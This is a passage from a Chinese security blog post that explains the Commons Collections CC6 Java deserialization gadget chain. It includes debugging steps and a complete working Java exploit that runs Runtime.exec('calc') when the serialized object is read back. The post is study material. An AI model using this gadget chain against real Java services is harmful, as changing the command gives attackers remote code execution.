alt="5twWvR.png"></a></p><p>但是，还有个问题就是如同在URLDNS链里一样，我们的目标是在反序列化阶段执行，但是put会在序列化之前就执行。我们要改变条件，让他在序列化阶段不被执行，反序列化阶段可以执行。因此我们就通过反射改变put时调用的函数参数，让他没法生效。在put结束后，序列化之前，再把参数改成有效参数。</p><p>即在put之前的某一步修改我们传入的值，put之后再使用反射，改回这个值，再进行序列化，这样我们序列化时put就不会成功调用，但是反序列化时由于参数正确，成功调用。但是实际操作时还是有问题：</p><p>我们补上反序列化代码，看一下效果，在序列化时没有异常：</p><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/5trpa6"><img src="https://z3.ax1x.com/2021/10/17/5trpa6.png" alt="5trpa6.png"></a></p><p>但是在反序列化时没有弹出计算器：</p><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/5trVsA"><img src="https://z3.ax1x.com/2021/10/17/5trVsA.png" alt="5trVsA.png"></a></p><p>我们下断点调试看一下：</p><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/5tryLR"><img src="https://z3.ax1x.com/2021/10/17/5tryLR.png" alt="5tryLR.png"></a></p><p>跟进去看发现这里的key因为赋值了，调过来transform。</p><p>那么我们就要在put之后，序列化之前，将lazymap的key删除：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lazymap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br></pre></td></tr></table></figure><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/5trzlQ"><img src="https://z3.ax1x.com/2021/10/17/5trzlQ.png" alt="5trzlQ.png"></a></p><p>之后我们再执行一次序列化/反序列化操作，成功弹出计算器：</p><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/5tsnX9"><img src="https://z3.ax1x.com/2021/10/17/5tsnX9.png" alt="5tsnX9.png"></a></p><h3 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h3><p>最后的测试代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"><span class="comment">//        Runtime r = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">////      一个Transformer类</span></span><br><span class="line"><span class="comment">//        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class&#125;,new Object[] &#123;&quot;calc&quot;&#125;);</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span>  Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125; )</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(Runtime.class);</span></span><br><span class="line">        <span class="comment">//       新建一个map类</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>));</span><br><span class="line"><span class="comment">//        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,chainedTransformer);</span></span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazymap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry, <span class="string">&quot;ccc&quot;</span>);</span><br><span class="line">        lazymap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class c = LazyMap.class;</span><br><span class="line">        Field factoryfield = c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        factoryfield.set(lazymap, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(map2);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos .writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception,ClassNotFoundException</span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        Class c = Runtime.class;</span></span><br><span class="line"><span class="comment">//        Method getRuntimeMethod = c.getMethod(&quot;getRuntime&quot;, null);</span></span><br><span class="line"><span class="comment">//        Runtime s = (Runtime) getRuntimeMethod.invoke(null, null);</span></span><br><span class="line"><span class="comment">//        Method execMethod = c.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">//        execMethod.invoke(r,&quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125; ,new Object[]&#123;&quot;getRuntime&quot;,null&#125; ).transform(Runtime.class);</span></span><br><span class="line"><span class="comment">//        Runtime m = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntimeMethod);</span></span><br><span class="line"><span class="comment">//        new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class&#125;,new Object[] &#123;&quot;calc&quot;&#125;).transform(m);</span></span><br><span class="line"><span class="comment">//        new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class&#125;,new Object[] &#123;&quot;calc&quot;&#125;).transform(r);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>入口类：可序列化、重写readObject()、接收任意对象作为参数</p></li><li><p>最后的危险方法：被不同类的同名函数被任意方法调用，比如transform调用transform的类可控，transform的参数也可控。</p></li></ul></div><div class="article-footer"><blockquote class="mt-2x"><ul class="post-copyright list-unstyled"><li class="post-copyright-link hidden-xs"><strong>本文链接：</strong> <a href="http://example.com/2021/10/17/CommonCollections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC6%E9%93%BE/" title="CommonCollections反序列化-CC6链" target="_blank" rel="external">http://example.com/2021/10/17/CommonCollections反序列化-CC6链/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！</li></ul></blockquote><div class="panel panel-default panel-badger"><div class="panel-body"><figure class="media"><div class="media-left"><a href="https://github.com/cofess" target="_blank" class="img-burn thumb-sm visible-lg"><img src="/images/avatar.jpg" class="img-rounded w-full" alt=""></a></div><div class="media-body"><h3 class="media-heading"><a href="https://github.com/cofess" target="_blank"><span class="text-dark">阿海已经听过这首歌</span><small class="ml-1x">OKC!!!</small></a></h3><div>个人简介。</div></div></figure></div></div></div></article><section id="comments"><div id="vcomments"></div></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="next"><a href="/2021/10/15/%E3%80%8AFastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%8B/" title="《Fastjson反序列化漏洞学习笔记》"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li></ul><button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>$</span></button><div class="bar-right"><div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div></div></div></nav><div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog"><div class="modal-dialog" role="document"><div class="modal-content donate"><button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button><div class="modal-body"><div class="donate-box"><div class="donate-head"><p>Maybe you could buy me a cup of coffee.</p></div><div class="tab-content"><div role="tabpanel" class="tab-pane fade active in" id="alipay"><div class="donate-payimg"><img src="/images/donate/alipayimg.png" alt="Scan Qrcode" title="Scan"></div><p class="text-muted mv">Scan this qrcode</p><p class="text-grey">Open alipay app scan this qrcode, buy me a coffee!</p></div><div role="tabpanel" class="tab-pane fade" id="wechatpay"><div class="donate-payimg"><img src="/images/donate/wechatpayimg.png" alt="Scan Qrcode" title="Scan"></div><p class="text-muted mv">Scan this qrcode</p><p class="text-grey">Open wechat app scan this qrcode, buy me a coffee!</p></div></div><div class="donate-footer"><ul class="nav nav-tabs nav-justified" role="tablist"><li role="presentation" class="active"><a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> alipay</a></li><li role="presentation"><a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> wechat payment</a></li></ul></div></div></div></div></div></div></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/cofess" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li><li><a href="http://weibo.com/cofess" target="_blank" title="Weibo" data-toggle="tooltip" data-placement="top"><i class="icon icon-weibo"></i></a></li><li><a href="https://twitter.com/iwebued" target="_blank" title="Twitter" data-toggle="tooltip" data-placement="top"><i class="icon icon-twitter"></i></a></li><li><a href="https://www.behance.net/cofess" target="_blank" title="Behance" data-toggle="tooltip" data-placement="top"><i class="icon icon-behance"></i></a></li><li><a href="/atom.xml" target="_blank" title="Rss" data-toggle="tooltip" data-placement="top"><i class="icon icon-rss"></i></a></li></ul><div class="copyright"><div class="publishby">Theme by <a href="https://github.com/cofess" target="_blank">cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.</div></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)"},ROOT_URL:"/",CONTENT_URL:"/content.json"}</script><script src="/js/insight.js"></script><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/npm/valine"></script><script type="text/javascript">var GUEST=["nick","mail","link"],meta=(meta="nick,mail,link").split(",").filter(function(e){return-1<GUEST.indexOf(e)});new Valine({el:"#vcomments",verify:!1,notify:!1,appId:"",appKey:"",placeholder:"Just go go",avatar:"mm",meta:meta,pageSize:"10",visitor:!1})</script></body></html>